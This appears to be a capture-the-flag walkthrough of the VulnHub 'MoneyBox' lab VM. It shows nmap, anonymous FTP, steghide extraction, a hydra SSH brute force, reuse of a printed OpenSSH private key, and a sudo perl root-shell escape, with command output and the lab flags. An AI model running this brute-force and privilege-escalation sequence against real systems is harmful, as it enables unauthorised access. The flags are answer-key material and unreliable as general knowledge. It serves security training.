@@ -1,0 +1,339 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.39<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# nmap -sC -sV 10.0.2.39 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 18:43 +0630<br/>
+Nmap scan report for 10.0.2.39<br/>
+Host is up (0.00011s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+21/tcp open &nbsp;ftp &nbsp; &nbsp; vsftpd 3.0.3<br/>
+| ftp-syst: <br/>
+| &nbsp; STAT: <br/>
+| FTP server status:<br/>
+| &nbsp; &nbsp; &nbsp;Connected to ::ffff:10.0.2.4<br/>
+| &nbsp; &nbsp; &nbsp;Logged in as ftp<br/>
+| &nbsp; &nbsp; &nbsp;TYPE: ASCII<br/>
+| &nbsp; &nbsp; &nbsp;No session bandwidth limit<br/>
+| &nbsp; &nbsp; &nbsp;Session timeout in seconds is 300<br/>
+| &nbsp; &nbsp; &nbsp;Control connection is plain text<br/>
+| &nbsp; &nbsp; &nbsp;Data connections will be plain text<br/>
+| &nbsp; &nbsp; &nbsp;At session startup, client count was 3<br/>
+| &nbsp; &nbsp; &nbsp;vsFTPd 3.0.3 - secure, fast, stable<br/>
+|_End of status<br/>
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>
+|_-rw-r--r-- &nbsp; &nbsp;1 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; 1093656 Feb 26 &nbsp;2021 trytofind.jpg<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 1e30ce7281e0a23d5c28888b12acfaac (RSA)<br/>
+| &nbsp; 256 019dfafbf20637c012fc018b248f53ae (ECDSA)<br/>
+|_ &nbsp;256 2f34b3d074b47f8d17d237b12e32f7eb (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: MoneyBox<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+MAC Address: 08:00:27:1D:36:21 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+After running nmap, I found that I can login ftp as anonymous and found trytofind.jpg file. So, I login into ftp and download jpg file.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ftp 10.0.2.39 &nbsp; &nbsp; <br/>
+Connected to 10.0.2.39.<br/>
+220 (vsFTPd 3.0.3)<br/>
+Name (10.0.2.39:root): anonymous<br/>
+331 Please specify the password.<br/>
+Password: <br/>
+230 Login successful.<br/>
+Remote system type is UNIX.<br/>
+Using binary mode to transfer files.<br/>
+ftp&gt; ls -la<br/>
+229 Entering Extended Passive Mode (|||17814|)<br/>
+150 Here comes the directory listing.<br/>
+drwxr-xr-x &nbsp; &nbsp;2 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Feb 26 &nbsp;2021 .<br/>
+drwxr-xr-x &nbsp; &nbsp;2 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Feb 26 &nbsp;2021 ..<br/>
+-rw-r--r-- &nbsp; &nbsp;1 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; 1093656 Feb 26 &nbsp;2021 trytofind.jpg<br/>
+226 Directory send OK.<br/>
+ftp&gt; get trytofind.jpg<br/>
+local: trytofind.jpg remote: trytofind.jpg<br/>
+229 Entering Extended Passive Mode (|||14382|)<br/>
+150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).<br/>
+100% |**************************************************************************************************| &nbsp;1068 KiB &nbsp; 19.72 MiB/s &nbsp; &nbsp;00:00 ETA<br/>
+226 Transfer complete.<br/>
+1093656 bytes received in 00:00 (19.59 MiB/s)<br/>
+ftp&gt; exit<br/>
+221 Goodbye.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Enmerating jpg file with stegihide (steganography):<br/>
+<br/>
+Found embedded data but I don't have a passphrase for this data. So, I tried enumerate to web application.<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# steghide info trytofind.jpg <br/>
+"trytofind.jpg":<br/>
+&nbsp; format: jpeg<br/>
+&nbsp; capacity: 64.2 KB<br/>
+Try to get information about embedded data ? (y/n)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Dirsearch Result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirsearch -u http://10.0.2.39/ -e php -f -x 400,403<br/>
+<br/>
+&nbsp; _|. _ _ &nbsp;_ &nbsp;_ &nbsp;_ _|_ &nbsp; &nbsp;v0.4.2<br/>
+&nbsp;(_||| _) (/_(_|| (_| )<br/>
+<br/>
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441<br/>
+<br/>
+Output File: /root/.dirsearch/reports/10.0.2.39/-_23-02-25_18-43-58.txt<br/>
+<br/>
+Error Log: /root/.dirsearch/logs/errors-23-02-25_18-43-58.log<br/>
+<br/>
+Target: http://10.0.2.39/<br/>
+<br/>
+[18:43:59] Starting: <br/>
+[18:44:10] 301 - &nbsp;306B &nbsp;- /blogs &nbsp;-&gt; &nbsp;http://10.0.2.39/blogs/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[18:44:10] 200 - &nbsp;353B &nbsp;- /blogs/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[18:44:16] 200 - &nbsp;621B &nbsp;- /index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Task Completed<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found directory called "blogs". So, I go to that directory and found another juciy info in source code.<br/>
+<br/>
+<br/>
+&lt;!--the hint is the another secret directory is S3cr3t-T3xt--&gt;<br/>
+<br/>
+It tell I have to go to another secret directory "S3cr3t-T3xt". Found passphrase for jpg embedded data in source code.<br/>
+<br/>
+<br/>
+&lt;!..Secret Key 3xtr4ctd4t4 &gt;<br/>
+<br/>
+passphrase - 3xtr4ctd4t4<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Extract Embedded data from jpg.<br/>
+<br/>
+Extract data with steghide using above passphrase:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# steghide extract -sf trytofind.jpg<br/>
+Enter passphrase: <br/>
+wrote extracted data to "data.txt".<br/>
+<br/>
+Successfully extracted.<br/>
+<br/>
+Read the data.txt and found ssh username "renu". Also tell us his password is too weak so I tried to bruteforce with rockyou.txt using hydra and got his/her password:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# cat data.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+Hello..... &nbsp;renu<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; I tell you something Important.Your Password is too Week So Change Your Password<br/>
+Don't Underestimate it.......<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# hydra -l renu -P /usr/share/wordlists/rockyou.txt 10.0.2.39 ssh<br/>
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br/>
+<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-25 18:53:37<br/>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br/>
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br/>
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br/>
+[DATA] attacking ssh://10.0.2.39:22/<br/>
+[22][ssh] host: 10.0.2.39 &nbsp; login: renu &nbsp; password: 987654321<br/>
+1 of 1 target successfully completed, 1 valid password found<br/>
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.<br/>
+[ERROR] 3 targets did not resolve or could not be connected<br/>
+[ERROR] 0 target did not complete<br/>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-25 18:54:39<br/>
+<br/>
+<br/>
+ssh username and password:<br/>
+<br/>
+username - renu<br/>
+password - 987654321<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Login into ssh (User Access)<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh renu@10.0.2.39 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+renu@10.0.2.39's password: <br/>
+Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Fri Feb 26 08:53:43 2021 from 192.168.43.44<br/>
+renu@MoneyBox:~$ whoami<br/>
+renu<br/>
+<br/>
+<br/>
+Successfully login into ssh with username "renu" with his/her weak password.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Switch into another user "lily"<br/>
+<br/>
+I can access into lily directory and also access into .ssh folder but I only found "authorized_keys" file so I decided to read it. Found out that "lily" is using her ssh id_rsa login with "renu" id_rsa key. So, I copy "renu" id_rsa key paste it into new created id_rsa file in my machine. And, give permission 600 and then ssh login as "lily" using that id_rsa key. Boom! now I got user access as "lily".<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Found same authorized_keys.<br/>
+<br/>
+-rw-r--r-- 1 renu renu 393 Feb 26 &nbsp;2021 /home/renu/.ssh/id_rsa.pub (renu)<br/>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian<br/>
+<br/>
+-rw-r--r-- 1 lily lily 393 Feb 26 &nbsp;2021 /home/lily/.ssh/authorized_keys (lily)<br/>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian<br/>
+<br/>
+Step 2:<br/>
+<br/>
+Copy and paste it into new created id_rsa in my machine.<br/>
+<br/>
+-----BEGIN OPENSSH PRIVATE KEY-----<br/>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn<br/>
+NhAAAAAwEAAQAAAQEA0SBPbRBG0y9APu5/qHfbQowEmAFmNFwanKs8qm9qrDbCZwZvHATA<br/>
+gTUpLboLaLPR2PYc0iJ5Dsw590YrWSV7nplwmrDrDOoAXLbuRg7i/PNnRYM/etjvU73Rey<br/>
+SZvNniIla7EvGAlUKuN5ooFrOh1ybvgTa1W3H/sat+m4s4kGlQcvrxm4gj6TdCU67RuOPT<br/>
+XTWXJdBQ5pZtmOp5R+NszOYQgtB0CYgcpnPyN+xtPVbVLGgqY4imsWWp4Jcm9vli0sZiX6<br/>
+/hIRp1jqUL/dYXsV3eyHZSuoYVDn3+cjcZbyFcxtlRG7oLSV7pDEi1pNhYZxHQy6ggh12P<br/>
+tVflxAfRdwAAA8hAXVfHQF1XxwAAAAdzc2gtcnNhAAABAQDRIE9tEEbTL0A+7n+od9tCjA<br/>
+SYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM<br/>
+6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq3<br/>
+6biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09<br/>
+VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2V<br/>
+EbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3AAAAAwEAAQAAAQBmBYE6D8q9lDufd/LH<br/>
+WVGaMXy8O1KFELna3J8H9rrvsPc+E6F45ciUQD8Kk8ylE7S4R7jfuvmcAn306EKVhve789<br/>
+c/YDgLYM00bfnoK7MI/CXRf6okYFjBXcUocj6eJx1u6yjwoOi96H3dmlMcYB4APHpzayEm<br/>
+r4KyRpvJfi3mJNjPLS2wNhotTlOKA3OYcuwq9PO5O3ftmAhd1m5YH91jSM/ykeRRe6jt7X<br/>
+aAbKqnvPWoXQVIzhYKqET68R1fCC6/BWGFPYkxvjGiC+N0OgMI82UMDXyKN5/DMU1/vLhj<br/>
+V98GkTL+X2fZYDnMpGSQjWIjMvjkZUfmDHYuwAdXPBFBAAAAgQChZCjF2uHbq2WgJETxHg<br/>
+grXSQcneY0oCVJQIGezhyl7Lip5CNT9P/0VBp6CcGJ8UpzmygtIvchinWd4rqmOOVwkRsR<br/>
+Mw78IgQuoTIzkxqBZ6nluk/PExFrIZNGxoD3PJgZ+9+3PLvhimeEW7BRpId9Mnyed6uwxi<br/>
+f1N9tfY7cSLAAAAIEA7F4NEJiRghxMDDF1qySIzmstCat2m0y3quqOPJvt/zZBuD9X/C0q<br/>
+GJXP9AvJsyoVZxCbSpESUlc0Y61bbCrhn48AEPly6KuM96zW8i3JW3d2G6TK38xzE2BrUx<br/>
+6y0sAYv5IP9P5UP/kIxGCafr+bUJThIUwWAkbPiBzSjuBfCE8AAACBAOJ/Bas5s3M8iE1Z<br/>
+7ZVt5tlGtN+9jTuxoqDP/9WuYAmKKlsu3KD1MGux6iF79MYlg7+8yKInTzuGTv/G3aD7Qf<br/>
+YhsiLPQ/9JdHubK82FYXSOR5ssO6Jl25UM5j2naZBQzhyogIP+P0daIu/hqYdXoHzxYGgU<br/>
+tTfxqrmU8rLImbJZAAAAC3JlbnVAZGViaWFuAQIDBAUGBw==<br/>
+-----END OPENSSH PRIVATE KEY-----<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# nano id_rsa &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# chmod 600 id_rsa<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Login using id_rsa key with "lily"<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/Moneybox]<br/>
+└─# ssh lily@10.0.2.39 -i id_rsa <br/>
+Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80<br/>
+lily@MoneyBox:~$<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation ((ALL : ALL) NOPASSWD: /usr/bin/perl)<br/>
+<br/>
+I execute sudo -l with user "lily" and that user allow to execute /usr/bin/perl as root so I go to gtfobin and found this payload for root access:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/perl/#sudo<br/>
+<br/>
+payload - sudo perl -e 'exec "/bin/sh";'<br/>
+<br/>
+lily@MoneyBox:~$ sudo -l<br/>
+Matching Defaults entries for lily on MoneyBox:<br/>
+&nbsp; &nbsp; env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br/>
+<br/>
+User lily may run the following commands on MoneyBox:<br/>
+&nbsp; &nbsp; (ALL : ALL) NOPASSWD: /usr/bin/perl<br/>
+lily@MoneyBox:~$ sudo perl -e 'exec "/bin/sh";'<br/>
+# whoami<br/>
+root<br/>
+<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Vulnhub flags<br/>
+<br/>
+renu@MoneyBox:~$ cat user1.txt <br/>
+Yes...!<br/>
+You Got it User1 Flag<br/>
+<br/>
+&nbsp;==&gt; us3r1{F14g:0ku74tbd3777y4}<br/>
+<br/>
+&nbsp;lily@MoneyBox:~$ cat user2.txt <br/>
+Yeah.....<br/>
+You Got a User2 Flag<br/>
+<br/>
+==&gt; us3r{F14g:tr5827r5wu6nklao}<br/>
+<br/>
+# cat .root.txt <br/>
+<br/>
+Congratulations.......!<br/>
+<br/>
+You Successfully completed MoneyBox<br/>
+<br/>
+Finally The Root Flag<br/>
+&nbsp; &nbsp; ==&gt; r00t{H4ckth3p14n3t}<br/>
+<br/>
+I'm Kirthik-KarvendhanT<br/>
+&nbsp; &nbsp; It's My First CTF Box<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+instagram : ____kirthik____<br/>
+<br/>
+See You Back....<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+# cat proof.txt<br/>
+5397e58008b1203f5de40fa3fdcabc8f<br/>
+<br/>
+# cat local.txt<br/>
+e36f6fdd5cf3dd48f610b64cab8586f3<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+</body></html>
